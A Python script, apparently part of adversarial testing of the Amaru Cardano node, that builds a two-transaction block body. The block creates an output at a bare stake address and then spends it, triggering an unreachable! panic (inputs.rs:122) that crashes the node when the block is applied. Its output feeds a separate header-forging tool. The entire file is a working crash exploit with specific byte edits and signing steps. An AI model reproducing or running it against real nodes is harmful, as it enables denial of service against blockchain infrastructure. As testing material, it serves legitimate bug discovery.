#!/usr/bin/env python3
"""Build the STAKE-ADDR 2-tx panic block body for cod-forge (M2 headline).
tx1: spend funding 9708b921#0 -> output0 at a BARE STAKE address (flip enterprise 0x60 -> stake 0xe0,
     same 28-byte key hash), signed by the funding key.
tx2: spend tx1#0 (the stake-addr UTxO) -> output to funding addr. Empty witness (the inputs.rs:122
     panic fires at address-resolution before witness checks).
On block-apply amaru applies tx1 (produces the stake-addr output), then tx2 inputs::execute
resolves tx1#0 -> Address::Stake -> unreachable! (inputs.rs:122) => CRASH.
Outputs stake-addr-block-segments.json {body_segments_cbor_hex, tx1_txid, tx2_txid} for cod-forge to
compute body_hash + forge the header.
"""
import cbor2, hashlib, json, sys
from pathlib import Path

FIX = Path("/home/nigel/dwarf-pragma/antithesis/cardano_amaru_adversarial/fixture")
sys.path.insert(0, str(FIX))
import txedit  # noqa: E402
from txedit import split_tx, items, rewrap, vkey  # noqa: E402

OUT = Path("/home/nigel/forge-work/pathb/outputs/forged-block")
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
_seed = bytes.fromhex(json.loads((FIX / "funding" / "payment.skey").read_text())["cborHex"])[2:]
pay = Ed25519PrivateKey.from_private_bytes(_seed)   # funding payment key


def sign_body(body_bytes, template_wits0):
    h = hashlib.blake2b(body_bytes, digest_size=32).digest()
    return {0: rewrap(template_wits0, [[vkey(pay), pay.sign(h)]])}


def main():
    raw = bytes.fromhex(json.loads((FIX / "mempool" / "mp-base.tx").read_text())["cborHex"])
    b, w, tail = split_tx(raw)
    base = cbor2.loads(b)
    wits = cbor2.loads(w)

    # --- tx1: drop aux (key 7), flip output0 address 0x60 -> 0xe0 (enterprise -> bare stake) ---
    out0 = base[1][0]                      # [addr_bytes, value]
    addr = bytearray(bytes(out0[0]))
    assert addr[0] == 0x60, f"expected enterprise header 0x60, got {addr[0]:#x}"
    addr[0] = 0xe0                          # bare stake address, same 28-byte hash, testnet network 0
    tx1_body = {0: base[0], 1: [[bytes(addr), out0[1]]], 2: base[2]}   # inputs, [stake-out], fee; no aux (key7 dropped)
    tx1_body_b = cbor2.dumps(tx1_body)
    tx1_wits = sign_body(tx1_body_b, wits[0])
    tx1_txid = hashlib.blake2b(tx1_body_b, digest_size=32).digest()

    # --- tx2: spend tx1#0 (the stake-addr UTxO) -> funding addr; empty witness ---
    fund_addr = bytes(out0[0])             # original 0x60 funding addr
    val = out0[1] if not isinstance(out0[1], list) else out0[1][0]
    fee2 = 1_000_000
    spend_val = (val if isinstance(val, int) else val) - fee2
    inp = base[0]
    inp_list = inp.value if isinstance(inp, cbor2.CBORTag) else inp
    tx2_input = rewrap(inp, [[tx1_txid, 0]]) if isinstance(inp, cbor2.CBORTag) else [[tx1_txid, 0]]
    tx2_body = {0: tx2_input, 1: [[fund_addr, spend_val]], 2: fee2}
    tx2_body_b = cbor2.dumps(tx2_body)
    tx2_wits = {}                          # empty; panic fires before witness check
    tx2_txid = hashlib.blake2b(tx2_body_b, digest_size=32).digest()

    # --- block body segments: [tx_bodies, tx_wits, aux_map, invalid_list] ---
    tx_bodies = [tx1_body, tx2_body]
    tx_wits = [tx1_wits, tx2_wits]
    aux_map = {}                           # no aux
    invalid = []                           # both is_valid=true (the crash is in validation, not the invalid path)
    body_segs = [tx_bodies, tx_wits, aux_map, invalid]
    seg_hex = cbor2.dumps(body_segs).hex()

    out = {
        "description": "STAKE-ADDR 2-tx panic block: tx1 creates a bare-stake-address output, tx2 spends it -> inputs.rs:122 panic on apply",
        "body_segments_cbor_hex": seg_hex,
        "tx1_txid": tx1_txid.hex(), "tx2_txid": tx2_txid.hex(),
        "n_txs": 2, "invalid_transactions": [],
        "note_for_codforge": "compute Conway segwit body_hash + body_size over body_segments_cbor_hex; forge header committing them; slot=eligible 97b0 slot; prev f4d474b8; height 234",
    }
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / "stake-addr-block-segments.json").write_text(json.dumps(out, indent=2) + "\n")
    print("wrote", OUT / "stake-addr-block-segments.json")
    print("tx1_txid", tx1_txid.hex(), "(stake-addr UTxO at tx1#0)")
    print("tx2 spends tx1#0 ; body_segments bytes", len(seg_hex) // 2)
    # sanity: re-decode segments
    dec = cbor2.loads(bytes.fromhex(seg_hex))
    print("segments decode OK: n_tx_bodies", len(dec[0]), "n_wits", len(dec[1]), "invalid", dec[3])
    # confirm tx1 output0 is a stake address (0xe0)
    a0 = bytes(dec[0][0][1][0][0])
    print("tx1 out0 addr header", hex(a0[0]), "(0xe0 = bare stake)")


if __name__ == "__main__":
    main()
